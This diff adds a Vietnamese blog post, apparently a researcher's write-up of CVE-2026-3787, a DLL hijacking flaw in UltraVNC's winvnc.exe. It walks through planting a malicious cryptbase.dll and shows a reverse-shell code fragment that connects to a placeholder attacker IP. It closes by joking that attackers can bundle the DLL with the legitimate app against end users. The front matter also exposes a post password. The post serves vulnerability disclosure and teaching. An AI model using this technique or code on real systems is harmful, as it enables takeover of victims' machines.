@@ -1,0 +1,99 @@
+<hr>
+<h2 id="title-CVE-2026-3787abbrlink-‘1e27815’date-2026-03-08-22-03-59hidden-truecategories-CVEpassword-ThhGG-214wwsss-78jh1tags-CVE-2026-3787"><a href="#title-CVE-2026-3787abbrlink-‘1e27815’date-2026-03-08-22-03-59hidden-truecategories-CVEpassword-ThhGG-214wwsss-78jh1tags-CVE-2026-3787" class="headerlink" title="title: CVE-2026-3787abbrlink: ‘1e27815’date: 2026-03-08 22:03:59hidden: truecategories: CVEpassword: ^%ThhGG@214wwsss$^%*78jh1tags:  - CVE-2026-3787"></a>title: CVE-2026-3787<br>abbrlink: ‘1e27815’<br>date: 2026-03-08 22:03:59<br>hidden: true<br>categories: CVE<br>password: ^%ThhGG@214wwsss$^%*78jh1<br>tags:<br>  - CVE-2026-3787</h2><p><img src="/posts/1e27815/image.png" alt="https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id&#x3D;CVE-2026-3787"></p>
+<hr>
+<h1 id="Mo-bai"><a href="#Mo-bai" class="headerlink" title="Mở bài"></a><strong>Mở bài</strong></h1><p>Hí anh em :D,</p>
+<p>Dạo gần đây lướt mấy cộng đồng security thì thấy một trend khá vui: <strong>DLL Hijacking</strong> lại được đào lên mổ xẻ đủ kiểu. Từ mấy bài research cho tới mấy chiến dịch tấn công ngoài thực tế, đâu đâu cũng thấy người ta nói về chuyện nhét DLL vào mấy ứng dụng legit rồi cho nó chạy ké bên trong.</p>
+<p>Thấy thiên hạ bàn tán rôm rả quá nên tôi cũng tò mò: <em>“Ủa, mấy cái khứa này thực sự dễ ăn vậy à?”</em></p>
+<p>Cơ mà nói thật, nghiên cứu bảo mật cũng hơi… tốn tiền. Nhiều tool xịn, nhiều phần mềm thương mại nhìn phát là biết giá không thân thiện với ví tiền. Mà bản thân tôi thì lại thuộc hệ <strong>gà, nghèo và đói nhưng thích vọc vạch</strong>.</p>
+<blockquote>
+<p>Thế nên giải pháp rất đơn giản: không có tiền mua đồ xịn thì <strong>lôi mấy app opensource ra mà nghịch :D</strong>.</p>
+</blockquote>
+<p>Ban đầu mục tiêu cũng chẳng cao siêu gì. Chỉ là mở ứng dụng lên, cắm vài tool giám sát xem khứa app này sẽ có những action gì trong hệ thống, xem nó load những DLL nào, rồi thử làm vài trò trẻ con kiểu:</p>
+<ul>
+<li>Đổi vị trí DLL</li>
+<li>Spam nhét thử DLL các DLL cơ bản.</li>
+<li>Xem Windows có “ăn bẫy” không</li>
+</ul>
+<p>Nói chung kiểu <strong>ngồi phá cho đỡ chán</strong>.</p>
+<p>Phần lớn thời gian thì chẳng có gì xảy ra. Ứng dụng chạy bình thường, Windows cũng không dễ bị lừa đến thế. Nhưng rồi trong một lần kiểm tra cơ chế tải thư viện của một ứng dụng, tôi nhận ra một chi tiết khá thú vị:</p>
+<p>Một DLL quan trọng được load… <strong>nhưng lại load đúng tại folder mà app nó chạy</strong>. Điều này có nghĩa là dễ ăn tiền thiên hạ :D</p>
+<p>Chỉ cần đặt một DLL cùng tên ở đúng vị trí trong chuỗi tìm kiếm — và ứng dụng sẽ <strong>tự tay load thư viện của bạn</strong>.</p>
+<p>Từ khoảnh khắc đó, <strong>CVE-2026-3787</strong> của khứa Haehansa ra đời :D.</p>
+<p>Trong bài viết này, tôi sẽ chia sẻ lại toàn bộ quá trình nghiên cứu: từ lúc chỉ đơn giản là tò mò trước trend DLL Hijacking, cho đến khi phân tích kỹ cơ chế tải thư viện của ứng dụng, xác định <strong>root cause</strong>, và xây dựng <strong>Proof-of-Concept (PoC)</strong> để chứng minh khả năng khai thác của lỗ hổng này.</p>
+<hr>
+<h1 id="Than-bai"><a href="#Than-bai" class="headerlink" title="Thân bài"></a><strong>Thân bài</strong></h1><h2 id="Thong-tin-chi-tiet-lo-hong"><a href="#Thong-tin-chi-tiet-lo-hong" class="headerlink" title="Thông tin chi tiết lỗ hổng"></a><strong>Thông tin chi tiết lỗ hổng</strong></h2><h3 id="Ten-lo-hong"><a href="#Ten-lo-hong" class="headerlink" title="Tên lỗ hổng:"></a><strong>Tên lỗ hổng:</strong></h3><p>UltraVNC Windows Service cryptbase.dll uncontrolled search path</p>
+<h3 id="Diem-CVSS"><a href="#Diem-CVSS" class="headerlink" title="Điểm CVSS"></a><strong>Điểm CVSS</strong></h3><table>
+<thead>
+<tr>
+<th align="center">Điểm số</th>
+<th align="center">Mức độ</th>
+<th align="center">Phiên bản CVSS</th>
+<th align="left">Vector tấn công</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">7.3</td>
+<td align="center">High</td>
+<td align="center">4.0</td>
+<td align="left">CVSS:4.0&#x2F;AV:L&#x2F;AC:H&#x2F;AT:N&#x2F;PR:L&#x2F;UI:N&#x2F;VC:H&#x2F;VI:H&#x2F;VA:H&#x2F;SC:N&#x2F;SI:N&#x2F;SA:N&#x2F;E:P</td>
+</tr>
+<tr>
+<td align="center">7.0</td>
+<td align="center">High</td>
+<td align="center">3.1</td>
+<td align="left">CVSS:3.1&#x2F;AV:L&#x2F;AC:H&#x2F;PR:L&#x2F;UI:N&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:H&#x2F;E:P&#x2F;RL:X&#x2F;RC:R</td>
+</tr>
+<tr>
+<td align="center">7.0</td>
+<td align="center">High</td>
+<td align="center">3.0</td>
+<td align="left">CVSS:3.0&#x2F;AV:L&#x2F;AC:H&#x2F;PR:L&#x2F;UI:N&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:H&#x2F;E:P&#x2F;RL:X&#x2F;RC:R</td>
+</tr>
+</tbody></table>
+<h3 id="Mo-ta-chi-tiet-lo-hong"><a href="#Mo-ta-chi-tiet-lo-hong" class="headerlink" title="Mô tả chi tiết lỗ hổng"></a><strong>Mô tả chi tiết lỗ hổng</strong></h3><h4 id="1-Thanh-phan-bi-anh-huong"><a href="#1-Thanh-phan-bi-anh-huong" class="headerlink" title="1. Thành phần bị ảnh hưởng"></a>1. Thành phần bị ảnh hưởng</h4><p>Lỗ hổng CVE-2026-3787 tồn tại trong ứng dụng UltraVNC phiên bản 1.6.4.0 trên hệ thống indows, cụ thể là trong tiến trình winvnc.exe (UltraVNC Server).</p>
+<h4 id="2-Ke-ho-trong-qua-trinh-load-DLL"><a href="#2-Ke-ho-trong-qua-trinh-load-DLL" class="headerlink" title="2. Kẻ hở trong quá trình load DLL"></a>2. Kẻ hở trong quá trình load DLL</h4><p>Trong trường hợp này, file cryptbase.dll là một DLL hệ thống legacy (thường nằm ở C:\Windows\SysWOW64\cryptbase.dll (x86) hoặc C:\Windows\System32 (x64)), nhưng winvnc.exe không load từ C:\Windows\SysWOW64\ mà thay vào đó:</p>
+<ul>
+<li>winvnc.exe tiến hành load CRYPTBASE.DLL trong thư mục hiện tại (application directory – nơi winvnc.exe nằm).</li>
+<li>Vì không tìm thấy file ở đó (NAME NOT FOUND), Windows tiếp tục tìm xuống các bước sau và cuối cùng load bản hợp lệ từ C:\Windows\SysWOW64\cryptbase.dll.<br><img src="/posts/1e27815/1.png" alt="Thứ tự load cryptbase.dll của winvnc.exe"></li>
+</ul>
+<h4 id="3-Lo-hong-nay-giup-ich-gi-cho-cuoc-song"><a href="#3-Lo-hong-nay-giup-ich-gi-cho-cuoc-song" class="headerlink" title="3. Lỗ hổng này giúp ích gì cho cuộc sống?"></a>3. Lỗ hổng này giúp ích gì cho cuộc sống?</h4><p>Trong trường hợp kẻ tấn công có khả năng đặt một DLL độc hại vào vị trí ưu tiên trong chuỗi tìm kiếm, ứng dụng sẽ tải và thực thi mã độc thay vì thư viện hợp lệ. Điều này cho phép kẻ tấn công thực thi mã tùy ý trong ngữ cảnh và quyền của tiến trình ứng dụng.<br>Lỗ hổng có thể bị khai thác để:</p>
+<ul>
+<li>Thực thi mã độc trên hệ thống nạn nhân.</li>
+<li>Leo thang đặc quyền (Privilege Escalation).</li>
+<li>Thiết lập cơ chế duy trì truy cập (Persistence).</li>
+<li>Thu thập thông tin nhạy cảm hoặc triển khai malware giai đoạn tiếp theo.</li>
+</ul>
+<h3 id="Cach-thuc-ke-tan-cong-loi-dung-lo-hong"><a href="#Cach-thuc-ke-tan-cong-loi-dung-lo-hong" class="headerlink" title="Cách thức kẻ tấn công lợi dụng lỗ hổng"></a>Cách thức kẻ tấn công lợi dụng lỗ hổng</h3><p>Kẻ tấn công có thể lợi dụng kẻ hở trên bằng cách đặt một file DLL độc hại vào thư mục cài đặt của UltraVNC bằng các bước sau:</p>
+<ul>
+<li>Tạo và đặt file cryptbase.dll (tên viết hoa&#x2F;thường không quan trọng vì Windows không phân biệt chữ hoa&#x2F;thường) chứa mã độc hại vào thư mục chứa winvnc.exe (Application Directory – App Dir).<br>→ Để đạt được việc này, kẻ tấn công có thể sử dụng các kỹ thuật xã hội (social engineering) như lừa người dùng admin cài đặt phần mềm giả mạo kèm theo DLL độc hại, hoặc khai thác lỗ hổng khác để có quyền ghi vào thư mục (ví dụ: copy file độc hại qua USB, chia sẻ file, hoặc script tự động nếu có quyền low-priv trước). Trong một số trường hợp, nếu UltraVNC được cài đặt ở vị trí writable mặc định hoặc kẻ tấn công đã có local access, việc drop file chỉ cần quyền write thông thường.</li>
+<li>Khi service winvnc.exe được khởi động hoặc khởi động lại, tiến trình sẽ tìm kiếm cryptbase.dll theo DLL Search Order.<br>→ Do thư mục chứa executable (App Dir) được ưu tiên cao hơn C:\Windows\SysWOW64 (vị trí chứa bản hệ thống hợp lệ), Windows sẽ phát hiện và load cryptbase.dll độc hại từ App Dir ngay lập tức → thay vì tiếp tục tìm xuống SysWOW64.</li>
+<li>Mã độc trong DLL giả mạo được thực thi tự động ngay khi load, chạy với quyền của service UltraVNC (thường là NT AUTHORITY\SYSTEM hoặc LocalSystem).<br>→ Kết quả: kẻ tấn công đạt được arbitrary code execution với quyền của service UltraVNC, dẫn đến privilege escalation (nâng quyền từ low-priv lên SYSTEM nếu hệ thống nạn nhân có lỗ hổng), persistence (duy trì truy cập lâu dài), injection mã độc vào các process khác, hoặc các hành vi phá hoại khác (ransomware, data exfil, v.v.)</li>
+</ul>
+<h3 id="Cach-chiem-quyen-dieu-khien-may-nan-nhan-thong-qua-Revershell"><a href="#Cach-chiem-quyen-dieu-khien-may-nan-nhan-thong-qua-Revershell" class="headerlink" title="Cách chiếm quyền điều khiển máy nạn nhân thông qua Revershell"></a>Cách chiếm quyền điều khiển máy nạn nhân thông qua Revershell</h3><p>Đúng vậy, việc khai thác lỗ hổng này không đơn thuần là để cho vui :D, phải pha 1 xíu trò nó mới sôi động :D</p>
+<p><strong>Bước 1:</strong> Xây dựng mã độc có chức năng Revershell</p>
+<pre><code class="language-c++">    target.sin_family = AF_INET;
+    target.sin_port = htons(&lt;port_máy_chủ_attacker&gt;);
+
+    if (inet_pton(AF_INET, &quot;&lt;ip_máy_chủ_attacker&gt;&quot;, &amp;target.sin_addr) != 1) {
+        closesocket(sock);
+        WSACleanup();
+        return 1;
+    }
+
+    if (connect(sock, (struct sockaddr*)&amp;target, sizeof(target)) == SOCKET_ERROR) {
+        closesocket(sock);
+        WSACleanup();
+        return 1;
+    }
+</code></pre>
+<p>Gồi gồi, hãy bắt tay vào code lại cryptbase.dll trên và triển khai 1 hàm có chức năng revershell nào.</p>
+<p><strong>Bước 2:</strong> Mở cổng lắng nghe traffic trên máy chủ Kali (máy chủ của kẻ tấn công)<br><img src="/posts/1e27815/2.png" alt="Giao diện Kali linux"></p>
+<p><strong>Bước 3:</strong> Vận chuyển tệp cryptbase.dll<br><img src="/posts/1e27815/3.png" alt="File cryptbase.dll nằm trong thư mục cùng cấp với winvnc.exe"></p>
+<p>Vận chuyển tệp cryptbase.dll độc hại vào folder chứa ứng dụng UltraVNC bị ảnh hưởng bởi lỗ hổng.</p>
+<p><strong>Bước 4:</strong> Khởi động dịch vụ VNC Server<br><img src="/posts/1e27815/4.png" alt="DLL Hijacking thành công"></p>
+<p>Khởi động dịch vụ VNC Server bằng việc double click vào file winvnc.exe, ngay lập tức thông báo Info DLL Hijacking vulnerable (thông báo đã được config trong mã độc cryptbase.dll) hiện ra. Quay về màn hình Kali linux, ta sẽ thấy điều bất ngờ :D</p>
+<p><strong>Bước 5:</strong> Thực thi lệnh độc hại từ Revershell<br><img src="/posts/1e27815/5.png" alt="Revershell thành công"></p>
+<p>Sau khi tiến trình <strong>winvnc.exe</strong> trên máy nạn nhân được khởi động, máy chủ Kali sẽ ghi nhận kết nối reverse shell inbound về cổng đã lắng nghe. Lúc này, kẻ tấn công đã có toàn quyền user thao tác trên máy nạn nhân thông qua shell tương tác nhận được.</p>
+<h1 id="Cai-ket"><a href="#Cai-ket" class="headerlink" title="Cái kết"></a><strong>Cái kết</strong></h1><p>Túm cái váy lại thì bài viết này đề cập đến CVE-2026-3787 là chính nên mị không tiện nói thêm nhiều cách khai thác khác trong bài, để đi farm dần dần :D</p>
+<p>Hy vọng rằng bài viết này không chỉ giúp minh họa một trường hợp thực tế của DLL Hijacking trong ứng dụng hợp pháp, mà còn cung cấp thêm góc nhìn về cách tiếp cận khi phân tích cơ chế tải DLL của phần mềm Windows. Với những ai đang tìm hiểu về kỹ thuật này, việc quan sát hành vi tải thư viện, hiểu rõ DLL search order, và sử dụng các công cụ phân tích phù hợp có thể giúp phát hiện ra những vấn đề bảo mật tương tự trong nhiều ứng dụng khác.</p>
+<p>Thực ra ae đi attack thì hay dùng phết, troll troll enduser và cài ứng dụng legit này kèm dll vào là ăn chắc :D</p>
